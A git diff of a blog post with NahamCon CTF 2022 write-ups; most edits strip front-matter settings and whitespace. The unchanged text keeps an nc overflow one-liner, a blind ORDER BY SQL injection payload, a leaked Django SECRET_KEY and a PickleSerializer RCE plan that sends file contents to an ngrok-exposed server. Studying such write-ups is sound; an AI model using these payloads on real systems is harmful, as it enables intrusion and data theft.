@@ -4,26 +4,7 @@ description: "Write-ups for the NahamCon CTF 2022 challenges."
 summary: "Solutions to the CTF challenges."
 date: 2022-04-28
 draft: false
-author: "Aftab Sama" # ["Me", "You"] # multiple authors
 tags: ["Web", "NahamCon", "CTF"]
-canonicalURL: ""
-showToc: true
-TocOpen: false
-TocSide: 'right'  # or 'left'
-# weight: 1
-# aliases: ["/first"]
-hidemeta: false
-comments: true
-disableHLJS: true # to disable highlightjs
-disableShare: true
-hideSummary: false
-searchHidden: false
-ShowReadingTime: true
-ShowBreadCrumbs: true
-ShowPostNavLinks: true
-ShowWordCount: true
-ShowRssButtonInSectionTermList: true
-# UseHugoToc: true
 ---
 
 ------------------------
@@ -120,7 +101,7 @@ python -c "print('a'* 2056)" | nc challenge.nahamcon.com 32216
 ```
 
 ```
-flag{de8b6655b538a0bf567b79a14f2669f6}  
+flag{de8b6655b538a0bf567b79a14f2669f6}
 ```
 
 ### Read The Rules:
@@ -234,7 +215,7 @@ Attachment: `fma.zip`
 
 looking at app.py we can say that it maybe valnurable to orderby blind sqli
 
-payload= 
+payload=
 ```
 (CASE WHEN (SELECT (SUBTR(flag, 1,1)) from flag) = 'f' THEN name ELSE atomic_number END)--
 ```
@@ -278,10 +259,10 @@ flag{order_by_blind}
 
 _Have your say! Poller is the place where all the important infosec questions are asked._
 
-there is a github link in cource code: https://github.com/congon4tor/poller 
+there is a github link in cource code: https://github.com/congon4tor/poller
 
-from looking at commit we know this is vulnerable to django PickleSerializer RCE and we also 
-found secret_key in previous commits there is also one fake key 
+from looking at commit we know this is vulnerable to django PickleSerializer RCE and we also
+found secret_key in previous commits there is also one fake key
 
 SECRET_KEY = `77m6p#v&(wk_s2+n5na-bqe!m)^zu)9typ#0c&@qd%8o6!`
 
@@ -290,7 +271,7 @@ first i created local server with python : `python -m http.server 80`
 
 and expose it to internet with ngrok : `ngrok http 80`
 
-now we craft our payload in a way that it will read file content and make a request 
+now we craft our payload in a way that it will read file content and make a request
 to our server with that file content in GET request here is final exploit in python :
 
 ```python
